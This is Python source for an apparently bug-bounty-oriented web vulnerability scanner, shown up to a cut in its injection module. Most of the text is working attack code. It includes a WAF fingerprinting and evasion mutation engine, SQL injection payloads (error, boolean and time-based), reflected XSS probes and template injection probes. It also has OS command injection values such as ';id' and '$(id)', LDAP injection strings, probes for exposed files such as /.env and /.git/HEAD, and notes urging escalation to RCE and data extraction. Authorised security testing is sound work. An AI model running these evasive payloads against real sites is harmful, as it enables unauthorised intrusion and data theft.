#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
All In One Bug Scanner
======================
Assistive VDP / bug-bounty scanner mapped to an OWASP-Top-10 style focus list:
  auth, SQLi, broken auth, access control, XSS, CSRF, injection,
  secrets/sensitive data, misconfiguration, passive subdomain takeover.

Core design:
  * WAF fingerprint -> payload mutation engine (comment-split before parens,
    versioned inline comments, whitespace substitution, keyword case swap,
    encoding layers, literal hexing, quote/operator swapping).
  * Every injection module replays each payload through N mutated variants.
  * Baselines + delta scoring so noise doesn't become findings.
  * Writes a timestamped .txt report with a verdict and an audit queue.

coded by e4zyy | NOEL BUNSIAU

Requires: requests
    pip install requests

Usage:
    python all_in_one_bug_scanner.py -u https://target.tld
    python all_in_one_bug_scanner.py -u https://target.tld --cookie "s=abc" --threads 12
    python all_in_one_bug_scanner.py -u target.tld --subdomains --proxy http://127.0.0.1:8080
    python all_in_one_bug_scanner.py --list-modules
"""

import argparse
import base64
import datetime
import json
import os
import random
import re
import socket
import ssl
import string
import sys
import threading
import time
import urllib.parse as up
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from html.parser import HTMLParser

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    sys.exit("[!] pip install requests")

BANNER = r"""
    ___    __    ___   ____                    _
   /   |  / /   / _ \ /  _/___  ____  ____ ___(_)___  _____
  / /| | / /   / // // / / __ \/ __ \/ __ `__ \ / __ \/ ___/
 / ___ |/ /___/ // // / / /_/ / /_/ / / / / / / / /_/ / /
/_/  |_/_____/____/___/\____/\____/_/ /_/ /_/_/\____/_/

  All In One Bug Scanner  |  VDP edition
  coded by e4zyy | NOEL BUNSIAU
"""

SEV_ORDER = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
SEV_TAG = {"critical": "[CRIT]", "high": "[HIGH]", "medium": "[MED ]",
           "low": "[LOW ]", "info": "[INFO]"}

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
]

WAF_SIGS = {
    "cloudflare":  [("header", "cf-ray"), ("header", "server", "cloudflare"), ("body", "cf-error-details")],
    "akamai":      [("header", "server", "akamaighost"), ("body", "Reference&#32;&#35;")],
    "sucuri":      [("header", "x-sucuri-id"), ("header", "server", "sucuri")],
    "imperva":     [("header", "x-iinfo"), ("body", "Incapsula incident")],
    "f5-bigip":    [("header", "server", "big-ip"), ("body", "The requested URL was rejected")],
    "aws-waf":     [("header", "x-amzn-requestid"), ("body", "AWS WAF")],
    "modsecurity": [("header", "server", "mod_security"), ("body", "ModSecurity")],
    "barracuda":   [("body", "Barracuda")],
    "wordfence":   [("body", "Wordfence")],
    "fastly":      [("header", "x-served-by"), ("header", "x-fastly-request-id")],
}

WAF_BLOCK_HINTS = [
    "access denied", "not acceptable", "request blocked", "web application firewall",
    "attention required", "the requested url was rejected", "incapsula incident",
    "malicious", "security policy", "captcha", "just a moment",
]

_rng = random.Random()


def _rand_word(n=8):
    return "".join(_rng.choice(string.ascii_lowercase) for _ in range(n))


# --- SQL mutation primitives -------------------------------------------------- #

FUNC_CALL = re.compile(r"\b([A-Za-z_][A-Za-z0-9_]*)\s*\(")
SQL_KEYWORDS = ("union", "select", "and", "or", "sleep", "waitfor", "delay",
                "from", "where", "order", "by", "group", "having", "like",
                "concat", "substring", "ascii", "extractvalue", "updatexml")


def m_comment_after_func(p):
    """SLEEP(5) -> SLEEP/**/(5)  (the classic WAF evade)."""
    return FUNC_CALL.sub(lambda m: m.group(1) + "/**/(", p)


def m_versioned_comment_after_func(p):
    return FUNC_CALL.sub(lambda m: m.group(1) + "/*!50000*/(", p)


def m_keyword_versioned(p):
    def repl(m):
        w = m.group(0)
        return "/*!50000%s*/" % w if w.lower() in SQL_KEYWORDS else w
    return re.sub(r"\b[A-Za-z]{2,12}\b", repl, p)


def m_case_swap(p):
    out = []
    for ch in p:
        out.append(ch.upper() if _rng.random() < 0.5 else ch.lower())
    return "".join(out)


def m_ws_to_comment(p):
    return re.sub(r" ", "/**/", p)


def m_ws_to_tab(p):
    return re.sub(r" ", "%09", p)


def m_ws_to_newline(p):
    return re.sub(r" ", "%0a", p)


def m_ws_to_plus(p):
    return re.sub(r" ", "+", p)


def m_keyword_split(p):
    for kw in ("union select", "order by", "group by", "waitfor delay",
               "and ", "or "):
        p = re.sub(kw, kw.replace(" ", "/**/"), p, flags=re.I)
    return p


def m_quote_swap(p):
    if '"' in p:
        return p.replace('"', "'")
    return p.replace("'", '"')


def m_eq_to_like(p):
    return p.replace("=", " LIKE ")


def m_and_or_swap(p):
    return re.sub(r"\bAND\b", "&&", p, flags=re.I)


def m_null_byte(p):
    return p + "%00"


def m_paren_tight(p):
    return re.sub(r"([A-Za-z_][A-Za-z0-9_]*)\s+\(", r"\1(", p)


def m_hex_literals(p):
    def repl(m):
        s = m.group(1)
        return "0x" + s.encode().hex() if s else m.group(0)
    return re.sub(r"'([^']{1,40})'", repl, p)


SQL_MUTATORS = [
    ("comment_after_func", m_comment_after_func),
    ("versioned_comment_after_func", m_versioned_comment_after_func),
    ("keyword_versioned", m_keyword_versioned),
    ("case_swap", m_case_swap),
    ("ws_to_comment", m_ws_to_comment),
    ("ws_to_tab", m_ws_to_tab),
    ("ws_to_newline", m_ws_to_newline),
    ("ws_to_plus", m_ws_to_plus),
    ("keyword_split", m_keyword_split),
    ("quote_swap", m_quote_swap),
    ("eq_to_like", m_eq_to_like),
    ("and_or_swap", m_and_or_swap),
    ("null_byte", m_null_byte),
    ("paren_tight", m_paren_tight),
    ("hex_literals", m_hex_literals),
]


def mutate_sql(payload, depth=2):
    """Return [payload, ...mutated variants] including the original."""
    variants = [payload]
    names = [n for n, _ in SQL_MUTATORS]
    for _ in range(depth):
        for name, fn in SQL_MUTATORS:
            try:
                v = fn(payload)
            except Exception:
                continue
            if v and v != payload and v not in variants:
                variants.append(v)
    # a few stacked combos
    for _ in range(depth):
        combo = payload
        for name, fn in _rng.sample(SQL_MUTATORS, 2):
            try:
                combo = fn(combo)
            except Exception:
                pass
        if combo not in variants:
            variants.append(combo)
    return variants


XSS_MUTATORS = [
    lambda p: p.replace("alert(1)", "alert`1`"),
    lambda p: p.replace("<script>", "<script >"),
    lambda p: p.replace("onerror=", "onerror ="),
    lambda p: p.replace("javascript:", "JaVaScRiPt:"),
    lambda p: p.replace("<svg", "<svg/"),
    lambda p: p.replace('"', "'"),
    lambda p: p.replace("alert(1)", "alert(document.domain)"),
    lambda p: p.replace("<img", "<img\tsrc=x"),
]


def mutate_xss(payload):
    variants = [payload]
    for fn in XSS_MUTATORS:
        try:
            v = fn(payload)
            if v not in variants:
                variants.append(v)
        except Exception:
            pass
    return variants


# --------------------------------------------------------------------------- #
#  Finding / report
# --------------------------------------------------------------------------- #

@dataclass
class Finding:
    module: str
    title: str
    severity: str
    url: str
    method: str = "GET"
    param: str = ""
    payload: str = ""
    evidence: str = ""
    request: str = ""
    response: str = ""
    remediation: str = ""
    audit_note: str = ""
    confidence: str = "firm"   # firm | tentative
    ts: str = field(default_factory=lambda: datetime.datetime.now().isoformat(timespec="seconds"))

    @property
    def key(self):
        return (self.module, self.title, self.url, self.param)


class Report:
    def __init__(self, outdir):
        self.outdir = outdir
        self.findings = []
        self.audit_queue = []
        self.lock = threading.Lock()
        self.notes = []
        self.t0 = time.time()

    def add(self, f):
        with self.lock:
            if any(x.key == f.key and x.payload == f.payload for x in self.findings):
                return
            self.findings.append(f)
            print("  %s %s  %s%s" % (SEV_TAG.get(f.severity, "[????]"), f.title,
                                     f.url[:96], " ?" + f.param if f.param else ""))

    def queue(self, item):
        with self.lock:
            if item not in self.audit_queue:
                self.audit_queue.append(item)

    def note(self, msg):
        with self.lock:
            self.notes.append(msg)

    def verdict(self):
        top = max([SEV_ORDER.get(f.severity, 0) for f in self.findings] or [0])
        firm = [f for f in self.findings if f.confidence == "firm"]
        topf = max([SEV_ORDER.get(f.severity, 0) for f in firm] or [0])
        if topf >= 3:
            return "VULNERABLE"
        if topf == 2 or top >= 3:
            return "LIKELY VULNERABLE"
        if top >= 1:
            return "WEAK / NEEDS MANUAL AUDIT"
        return "NO CONFIRMED VULNERABILITIES"

    def write(self, target):
        os.makedirs(self.outdir, exist_ok=True)
        host = re.sub(r"[^A-Za-z0-9._-]", "_", up.urlsplit(target).netloc or target)
        stamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
        path = os.path.join(self.outdir, "%s_%s.txt" % (host, stamp))

        ordered = sorted(self.findings, key=lambda f: (-SEV_ORDER.get(f.severity, 0), f.module))
        counts = {}
        for f in ordered:
            counts[f.severity] = counts.get(f.severity, 0) + 1

        with open(path, "w", encoding="utf-8") as fh:
            w = fh.write
            w("=" * 78 + "\n")
            w("All In One Bug Scanner - report\n")
            w("coded by e4zyy | NOEL BUNSIAU\n")
            w("=" * 78 + "\n\n")
            w("Target    : %s\n" % target)
            w("Started   : %s\n" % datetime.datetime.fromtimestamp(self.t0).isoformat(timespec="seconds"))
            w("Duration  : %.1fs\n" % (time.time() - self.t0))
            w("Findings  : %d\n" % len(self.findings))
            for sev in ("critical", "high", "medium", "low", "info"):
                if counts.get(sev):
                    w("  %-9s %d\n" % (sev, counts[sev]))
            w("\nVERDICT   : %s\n" % self.verdict())
            w("\n" + "-" * 78 + "\n\n")

            if self.notes:
                w("[ ENVIRONMENT / WAF NOTES ]\n")
                for n in self.notes:
                    w("  - %s\n" % n)
                w("\n")

            if self.audit_queue:
                w("[ AUDIT QUEUE - manual review, not yet confirmed ]\n")
                for q in self.audit_queue:
                    w("  - %s\n" % q)
                w("\n")

            if not ordered:
                w("Nothing fired. Read the notes section: WAF blocking, JS-only app,\n"
                  "or auth-gated surface are the usual causes.\n")

            for i, f in enumerate(ordered, 1):
                w("#%d %s %s\n" % (i, SEV_TAG.get(f.severity, "?"), f.title))
                w("module      : %s\n" % f.module)
                w("confidence  : %s\n" % f.confidence)
                w("url         : %s\n" % f.url)
                w("method      : %s\n" % f.method)
                if f.param:
                    w("parameter   : %s\n" % f.param)
                if f.payload:
                    w("payload     : %s\n" % f.payload)
                if f.evidence:
                    w("evidence    : %s\n" % f.evidence.replace("\n", "\n              "))
                if f.request:
                    w("request     :\n%s\n" % f.request[:1200])
                if f.response:
                    w("response    :\n%s\n" % f.response[:1200])
                if f.remediation:
                    w("remediation : %s\n" % f.remediation)
                if f.audit_note:
                    w("audit note  : %s\n" % f.audit_note)
                w("\n" + "-" * 78 + "\n\n")

            w("Reports are leads. Confirm every HIGH+ manually before submitting.\n")

        jpath = path.replace(".txt", ".json")
        with open(jpath, "w", encoding="utf-8") as fh:
            json.dump({"target": target, "verdict": self.verdict(),
                       "findings": [f.__dict__ for f in ordered]}, fh, indent=2)
        return path, jpath


# --------------------------------------------------------------------------- #
#  HTTP client
# --------------------------------------------------------------------------- #

@dataclass
class Cfg:
    timeout: float = 12.0
    delay: float = 0.0
    threads: int = 8
    depth: int = 2
    max_urls: int = 220
    insecure: bool = True
    proxy: str = None
    cookie: str = ""
    headers: dict = field(default_factory=dict)
    retries: int = 1
    variants: int = 12
    sleep: int = 5
    quiet: bool = False
    subdomains: bool = False
    max_bytes: int = 400_000


class Client:
    def __init__(self, cfg):
        self.cfg = cfg
        self._tl = threading.local()

    def _sess(self):
        s = getattr(self._tl, "s", None)
        if s is None:
            s = requests.Session()
            s.verify = not self.cfg.insecure
            s.max_redirects = 8
            if self.cfg.proxy:
                s.proxies = {"http": self.cfg.proxy, "https": self.cfg.proxy}
            s.headers.update({"User-Agent": _rng.choice(UAS),
                              "Accept": "text/html,application/json,*/*",
                              "Accept-Language": "en-US,en;q=0.9",
                              "Connection": "keep-alive"})
            if self.cfg.cookie:
                s.headers["Cookie"] = self.cfg.cookie
            s.headers.update(self.cfg.headers)
            self._tl.s = s
        return s

    def req(self, method, url, data=None, json_body=None, headers=None,
            allow_redirects=True, timeout=None):
        if self.cfg.delay:
            time.sleep(self.cfg.delay)
        h = dict(headers or {})
        for _ in range(self.cfg.retries + 1):
            t = time.time()
            try:
                r = self._sess().request(method, url, data=data, json=json_body,
                                         headers=h, allow_redirects=allow_redirects,
                                         timeout=timeout or self.cfg.timeout)
                r.elapsed_ms = (time.time() - t) * 1000
                if len(r.content) > self.cfg.max_bytes:
                    r._content = r._content[: self.cfg.max_bytes]
                return r
            except Exception:
                if _ == self.cfg.retries:
                    return None
                time.sleep(0.3)
        return None

    def get(self, url, **kw):
        return self.req("GET", url, **kw)


def snippet(text, n=300):
    return re.sub(r"\s+", " ", (text or ""))[:n]


def dump_req(r):
    try:
        return "%s %s\n%s" % (r.request.method, r.request.url,
                              "\n".join("%s: %s" % (k, v) for k, v in r.request.headers.items()
                                        if k.lower() in ("host", "content-type", "cookie", "referer", "origin")))
    except Exception:
        return ""


# --------------------------------------------------------------------------- #
#  Target modelling
# --------------------------------------------------------------------------- #

class Parser(HTMLParser):
    def __init__(self, base):
        super().__init__(convert_charrefs=True)
        self.base = base
        self.links = set()
        self.forms = []
        self._form = None

    def handle_starttag(self, tag, attrs):
        a = {k: (v or "") for k, v in attrs}
        if tag == "a" and a.get("href"):
            self.links.add(up.urljoin(self.base, a["href"]))
        elif tag in ("script", "iframe") and a.get("src"):
            self.links.add(up.urljoin(self.base, a["src"]))
        elif tag == "link" and a.get("href"):
            self.links.add(up.urljoin(self.base, a["href"]))
        elif tag == "form":
            self._form = {"action": up.urljoin(self.base, a.get("action") or self.base),
                          "method": (a.get("method") or "get").lower(), "params": {}}
        elif tag in ("input", "textarea", "select") and self._form is not None and a.get("name"):
            self._form["params"][a["name"]] = a.get("value") or "e4zyy"

    def handle_endtag(self, tag):
        if tag == "form" and self._form:
            self.forms.append(self._form)
            self._form = None


@dataclass
class Point:
    url: str
    param: str
    method: str = "GET"
    kind: str = "query"          # query | form | json
    form: dict = field(default_factory=dict)

    def build(self, payload):
        """Return (url, data, json_body) with payload substituted."""
        if self.kind == "query":
            return set_qs(self.url, self.param, payload), None, None
        if self.kind == "form":
            d = dict(self.form)
            d[self.param] = payload
            return self.url, d, None
        if self.kind == "json":
            d = dict(self.form)
            d[self.param] = payload
            return self.url, None, d
        return self.url, None, None

    def fetch(self, client, payload, headers=None):
        url, data, js = self.build(payload)
        h = dict(headers or {})
        if self.kind == "json":
            h.setdefault("Content-Type", "application/json")
        elif self.kind == "form":
            h.setdefault("Content-Type", "application/x-www-form-urlencoded")
        return client.req(self.method, url, data=data, json_body=js, headers=h)

    def label(self):
        return "%s %s [%s]" % (self.method, self.url, self.param)


def set_qs(url, name, value):
    p = up.urlsplit(url)
    q = up.parse_qsl(p.query, keep_blank_values=True)
    q = [(k, value if k == name else v) for k, v in q]
    qs = "&".join("%s=%s" % (up.quote(k, safe=""), up.quote(v, safe="/=&#?+%@;:,$!*'()~"))
                  for k, v in q)
    return up.urlunsplit((p.scheme, p.netloc, p.path, qs, p.fragment))


COMMON_PARAMS = [
    "id", "q", "s", "search", "query", "page", "cat", "category", "product",
    "user", "username", "email", "name", "file", "path", "url", "redirect",
    "next", "return", "ref", "lang", "view", "type", "action", "slug", "p",
    "order", "sort", "filter", "token", "code", "key", "item", "node", "dir",
]

FORCED_PATHS = [
    "/admin", "/admin/", "/administrator", "/login", "/wp-admin/", "/wp-login.php",
    "/api", "/api/v1", "/api/v2", "/graphql", "/swagger", "/swagger-ui.html",
    "/api/docs", "/actuator", "/actuator/health", "/actuator/env", "/console",
    "/.git/HEAD", "/.env", "/.env.bak", "/.svn/entries", "/.DS_Store",
    "/robots.txt", "/sitemap.xml", "/server-status", "/phpinfo.php", "/info.php",
    "/debug", "/metrics", "/health", "/backup.zip", "/backup.sql", "/db.sql",
    "/config.php.bak", "/web.config", "/package.json", "/composer.json",
    "/.well-known/security.txt", "/crossdomain.xml", "/sitemap_index.xml",
]

TAKEOVER_FP = {
    "s3":       (r"\.s3[.-][a-z0-9-]*\.amazonaws\.com$", r"NoSuchBucket|The specified bucket does not exist"),
    "heroku":   (r"\.herokuapp\.com$", r"No such app|heroku \| no such app"),
    "github":   (r"\.github\.io$", r"There isn't a GitHub Pages site here"),
    "azure":    (r"\.(cloudapp|azurewebsites|trafficmanager)\.net$", r"404 Web Site not found|Web Site not found"),
    "shopify":  (r"\.myshopify\.com$", r"Sorry, this shop is currently unavailable"),
    "zendesk":  (r"\.zendesk\.com$", r"Help Center Closed"),
    "unbounce": (r"\.unbouncepages\.com$", r"The requested URL was not found"),
    "fastly":   (r"\.fastly\.net$", r"Fastly error: unknown domain"),
    "ghost":    (r"\.ghost\.io$", r"Domain not found"),
    "tumblr":   (r"\.tumblr\.com$", r"Whatever you were looking for"),
    "readme":   (r"\.readme\.io$", r"Project doesnt exist"),
    "surge":    (r"\.surge\.sh$", r"project not found"),
    "bitbucket":(r"\.bitbucket\.io$", r"Repository not found"),
}

SECRET_RX = {
    "AWS access key":        r"\bAKIA[0-9A-Z]{16}\b",
    "AWS secret key":        r"aws_secret_access_key\s*[:=]\s*['\"]?([A-Za-z0-9/+=]{40})",
    "Google API key":        r"\bAIza[0-9A-Za-z_\-]{35}\b",
    "Stripe secret":         r"\bsk_live_[0-9a-zA-Z]{24,}\b",
    "Stripe publishable":    r"\bpk_live_[0-9a-zA-Z]{24,}\b",
    "GitHub token":          r"\bgh[pousr]_[A-Za-z0-9]{36,}\b",
    "Slack token":           r"\bxox[baprs]-[A-Za-z0-9-]{10,}\b",
    "SendGrid key":          r"\bSG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}\b",
    "Twilio SID":            r"\bAC[a-f0-9]{32}\b",
    "Private key block":     r"-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----",
    "JWT":                   r"\beyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\b",
    "Firebase URL":          r"https://[a-z0-9-]+\.firebaseio\.com",
    "Azure storage key":     r"AccountKey=[A-Za-z0-9+/=]{40,}",
    "Basic auth in URL":     r"[a-z]+://[^\s:/@]+:[^\s:/@]+@",
}

SQL_ERRORS = {
    "mysql":     [r"SQL syntax.*MySQL", r"Warning.*mysqli?_", r"MySQLSyntaxErrorException",
                  r"valid MySQL result", r"check the manual that (?:corresponds|correspond) to your MySQL"],
    "mssql":     [r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"SQLServer JDBC Driver",
                  r"Unclosed quotation mark after the character string", r"SqlException",
                  r"System\.Data\.SqlClient\.SqlException"],
    "postgres":  [r"PostgreSQL.*ERROR", r"Warning.*\Wpg_", r"valid PostgreSQL result",
                  r"PSQLException", r"unterminated quoted string"],
    "oracle":    [r"\bORA-\d{5}\b", r"Oracle error", r"Oracle.*Driver", r"quoted string not properly terminated"],
    "sqlite":    [r"SQLite/JDBCDriver", r"SQLite\.Exception", r"System\.Data\.SQLite\.SQLiteException",
                  r"unrecognized token:"],
    "generic":   [r"SQL command not properly ended", r"SQLSTATE\[", r"syntax error at or near",
                  r"An error has occurred in the script on this page"],
}

DEBUG_HINTS = [r"Traceback \(most recent call last\)", r"Fatal error:", r"Warning: .* on line \d+",
               r"Notice: .* on line \d+", r"System\.NullReferenceException", r"at [\w.]+\([\w.]+\.java:\d+\)",
               r"Whitelabel Error Page", r"stack trace", r"Stacktrace:", r"DEBUG = True",
               r"Django Version:", r"werkzeug", r"X-Powered-By"]


# --------------------------------------------------------------------------- #
#  Recon
# --------------------------------------------------------------------------- #

def normalize(target):
    if not re.match(r"^https?://", target):
        target = "https://" + target
    return target.rstrip("/")


def detect_waf(client, base, report):
    hits = []
    r = client.get(base)
    if r is None:
        return hits
    hdr = {k.lower(): v.lower() for k, v in r.headers.items()}
    body = (r.text or "").lower()[:8000]
    for name, sigs in WAF_SIGS.items():
        for sig in sigs:
            if sig[0] == "header":
                if sig[1] in hdr and (len(sig) == 2 or sig[2] in hdr[sig[1]]):
                    hits.append(name)
            elif sig[0] == "body" and sig[1].lower() in body:
                hits.append(name)
    # active probe
    probe = base + ("&" if "?" in base else "?") + "e4zyy=%3Cscript%3Ealert(1)%3C/script%3E%27%22%3E%3C"
    r2 = client.get(probe)
    if r2 is not None:
        if r2.status_code in (403, 406, 419, 429, 501, 503):
            hits.append("active-block(%d)" % r2.status_code)
        low = (r2.text or "").lower()[:4000]
        for h in WAF_BLOCK_HINTS:
            if h in low:
                hits.append("block-page")
                break
    hits = sorted(set(hits))
    if hits:
        report.note("WAF indicated: %s -> mutations enabled, delay %ss"
                    % (", ".join(hits), max(client.cfg.delay, 0.15)))
        client.cfg.delay = max(client.cfg.delay, 0.15)
    else:
        report.note("No WAF fingerprint from passive or active probe.")
    return hits


def crawl(client, base, cfg, report):
    """BFS same-host crawl. Returns (urls, forms)."""
    host = up.urlsplit(base).netloc
    seen, urls, forms = set(), [], []
    q = deque([(base, 0)])
    while q and len(seen) < cfg.max_urls:
        url, d = q.popleft()
        if url in seen:
            continue
        seen.add(url)
        r = client.get(url)
        if r is None or "html" not in r.headers.get("Content-Type", "").lower():
            if r is not None:
                urls.append(url)
            continue
        urls.append(url)
        p = Parser(url)
        try:
            p.feed(r.text)
        except Exception:
            pass
        forms.extend([f for f in p.forms if up.urlsplit(f["action"]).netloc in ("", host)])
        if d < cfg.depth:
            for link in p.links:
                sp = up.urlsplit(link)
                if sp.netloc != host or sp.scheme not in ("http", "https"):
                    continue
                link = link.split("#")[0]
                if link not in seen and len(seen) < cfg.max_urls:
                    q.append((link, d + 1))
        if "/robots.txt" not in seen:
            seen.add(base + "/robots.txt")
            rr = client.get(base + "/robots.txt")
            if rr is not None and rr.status_code == 200:
                for line in rr.text.splitlines():
                    if line.lower().startswith("disallow:"):
                        path = line.split(":", 1)[1].strip()
                        if path and "*" not in path:
                            q.append((up.urljoin(base, path), d + 1))
    report.note("Crawled %d URLs, %d forms." % (len(urls), len(forms)))
    return urls, forms


def build_points(urls, forms):
    points, seen = [], set()
    for u in urls:
        qs = up.parse_qsl(up.urlsplit(u).query, keep_blank_values=True)
        for k, _ in qs:
            p = Point(u, k, "GET", "query")
            if p.label() not in seen:
                seen.add(p.label()); points.append(p)
        # also seed common params on paramless paths
        if not qs:
            for cp in COMMON_PARAMS[:14]:
                p = Point(set_qs(u, cp, "1"), cp, "GET", "query")
                if p.label() not in seen:
                    seen.add(p.label()); points.append(p)
    for f in forms:
        for k in f["params"]:
            kind = "form" if f["method"] == "post" else "query"
            if kind == "query":
                p = Point(set_qs(f["action"], k, "1"), k, "GET", "query")
            else:
                p = Point(f["action"], k, "POST", "form", dict(f["params"]))
            if p.label() not in seen:
                seen.add(p.label()); points.append(p)
    return points


# --------------------------------------------------------------------------- #
#  Baseline
# --------------------------------------------------------------------------- #

def baseline(client, point):
    r = point.fetch(client, "e4zyy1")
    if r is None:
        return None
    return {"status": r.status_code, "len": len(r.text or ""), "text": r.text or "",
            "time": r.elapsed_ms}


def differs(b, r, len_tol=0.02):
    if r is None:
        return False
    if r.status_code != b["status"] and r.status_code < 500:
        return True
    a, c = b["len"], len(r.text or "")
    if a == 0:
        return c > 40
    return abs(c - a) / float(a) > len_tol


# --------------------------------------------------------------------------- #
#  Modules
# --------------------------------------------------------------------------- #

def mod_sqli(ctx, point):
    b = baseline(ctx.client, point)
    if b is None:
        return
    error_payloads = ["'", "\"", "')", "\"]", "';", "'-- -", "'#", "\\", "'||'", "1'"]
    seen_db = set()
    for base_p in error_payloads:
        for v in mutate_sql(base_p, depth=1)[:6]:
            r = point.fetch(ctx.client, v)
            if r is None:
                continue
            body = r.text or ""
            for db, pats in SQL_ERRORS.items():
                if db in seen_db:
                    continue
                for pat in pats:
                    m = re.search(pat, body, re.I)
                    if m:
                        seen_db.add(db)
                        ctx.report.add(Finding(
                            "sqli", "SQL injection (error-based, %s)" % db, "high",
                            point.url, point.method, point.param, v,
                            "DB error matched: %s" % snippet(m.group(0), 120),
                            dump_req(r), snippet(body, 600),
                            "Parameterise queries; whitelist identifiers.",
                            "Re-confirm in Burp Repeater, then extract with UNION/boolean.",
                            "firm"))
                        break
            if seen_db:
                break

    # boolean pair
    for t, f in [("' AND '1'='1", "' AND '1'='2"), ("1 AND 1=1", "1 AND 1=2"),
                 ("' AND 1=1-- -", "' AND 1=2-- -")]:
        rt = point.fetch(ctx.client, t)
        rf = point.fetch(ctx.client, f)
        if rt is None or rf is None:
            continue
        lt, lf = len(rt.text or ""), len(rf.text or "")
        if rt.status_code == rf.status_code and lt and abs(lt - lf) / float(max(lt, 1)) > 0.03:
            ctx.report.add(Finding(
                "sqli", "SQL injection (boolean differential)", "high",
                point.url, point.method, point.param, "%s | %s" % (t, f),
                "True=%dB / False=%dB, same status %d" % (lt, lf, rt.status_code),
                dump_req(rt), "", "Parameterise queries.", "Confirm by bisecting one char of output.",
                "tentative"))
            break

    # time-based with mutation (this is where the WAF bypass matters)
    for db, tmpl in [("mysql", "' AND SLEEP(%d)-- -"), ("mssql", "'; WAITFOR DELAY '0:0:%d'-- -"),
                     ("postgres", "' AND pg_sleep(%d)-- -")]:
        raw = tmpl % ctx.cfg.sleep
        for v in mutate_sql(raw, depth=1)[:6]:
            r = point.fetch(ctx.client, v)
            if r is None:
                continue
            if r.elapsed_ms > (b["time"] + ctx.cfg.sleep * 800):
                ctx.report.add(Finding(
                    "sqli", "SQL injection (time-based blind, %s)" % db, "high",
                    point.url, point.method, point.param, v,
                    "%.0fms vs baseline %.0fms" % (r.elapsed_ms, b["time"]),
                    dump_req(r), "", "Parameterise queries.", "Re-time 3x to rule out jitter.", "tentative"))
                break


def mod_xss(ctx, point):
    b = baseline(ctx.client, point)
    if b is None:
        return
    tok = "e4z" + _rand_word(5)
    probes = [
        ('%s<script>alert(1)</script>' % tok, "raw script"),
        ('"><script>alert(1)</script>', "double-quote break"),
        ("'><script>alert(1)</script>", "single-quote break"),
        ('%s<img src=x onerror=alert(1)>' % tok, "img onerror"),
        ('%s<svg onload=alert(1)>' % tok, "svg onload"),
        ('javascript:alert(1)', "scheme"),
    ]
    for p, label in probes:
        for v in mutate_xss(p)[:4]:
            r = point.fetch(ctx.client, v)
            if r is None:
                continue
            body = r.text or ""
            if tok in v and tok not in body:
                continue
            if "<script>alert(1)" in body or "onerror=alert(1)" in body.lower() \
               or "onload=alert(1)" in body.lower():
                # crude context check
                idx = body.find("alert(1)")
                ctx_txt = body[max(0, idx - 120): idx + 40]
                sev = "medium"
                if "<script>" in ctx_txt.lower() or "onerror" in ctx_txt.lower():
                    sev = "high"
                ctx.report.add(Finding(
                    "xss", "Reflected XSS (%s)" % label, sev,
                    point.url, point.method, point.param, v,
                    "Payload reflected unencoded. Context: %s" % snippet(ctx_txt, 160),
                    dump_req(r), "", "Context-aware output encoding + CSP.",
                    "Check DOM sink and whether CSP blocks inline execution.", "firm"))
                return
            if tok in body and tok in v:
                ctx.report.queue("XSS reflection, encoding unverified: %s [%s]" % (point.label(), v[:40]))
                return

    # DOM sinks
    r = point.fetch(ctx.client, "e4zyy1")
    if r is not None:
        for sink in ("innerHTML", "document.write", "eval(", "location.hash", "dangerouslySetInnerHTML"):
            if sink in (r.text or ""):
                ctx.report.queue("DOM sink '%s' present: %s" % (sink, point.url))
                break


def mod_injection(ctx, point):
    b = baseline(ctx.client, point)
    if b is None:
        return
    tok = _rand_word(6)

    # SSTI
    for p, engine in [("{{7*7}}", "Jinja/Twig"), ("${7*7}", "Freemarker/JSP"),
                      ("<%= 7*7 %>", "ERB"), ("#{7*7}", "Ruby"), ("*{7*7}", "Spring"),
                      ("@(7*7)", "Razor"), ("{{7*'7'}}", "Jinja str")]:
        r = point.fetch(ctx.client, p)
        if r is not None and re.search(r"\b(49|7777777)\b", r.text or "") and not re.search(r"\b(49|7777777)\b", b["text"]):
            ctx.report.add(Finding("injection", "Server-side template injection", "critical",
                                   point.url, point.method, point.param, p,
                                   "Arithmetic evaluated server-side (49 present).",
                                   dump_req(r), snippet(r.text), "Sandbox the template engine.",
                                   "Escalate to RCE via engine-specific chains.", "firm"))
            break

    # command injection
    for p, label in [(";id", "semicolon"), ("|id", "pipe"), ("$(id)", "subshell"),
                     ("`id`", "backtick"), ("%0aid", "newline")]:
        r = point.fetch(ctx.client, p)
        if r is not None and re.search(r"uid=\d+\([\w-]+\)", r.text or ""):
            ctx.report.add(Finding("injection", "OS command injection (%s)" % label, "critical",
                                   point.url, point.method, point.param, p,
                                   re.search(r"uid=\d+\([\w-]+\)[^\n<]{0,80}", r.text).group(0),
                                   dump_req(r), snippet(r.text), "Avoid shell; use arg arrays.",
                                   "Try blind OOB with DNS callback.", "firm"))
            break

    # LDAP
    for p in ("*)(uid=*))(|(uid=*", "*))%00"):
        r = point.fetch(ctx.client, p)
        if r is not None and differs(b, r) and re.search(r"(ldap|directory|invalid dn|size limit)", r.text or "", re.I):
            ctx.report.add(Finding("injection", "LDAP injection (heuristic)", "medium",
                                   point.url, point.method, point.param, p,
                                   "Response changed and LDAP text present.", dump_req(r), snippet(r.text),
                                   "Escape LDAP metacharacters.", "Verify with attribute enumeration.", "tentative"))
            break

    # CRLF / header injection
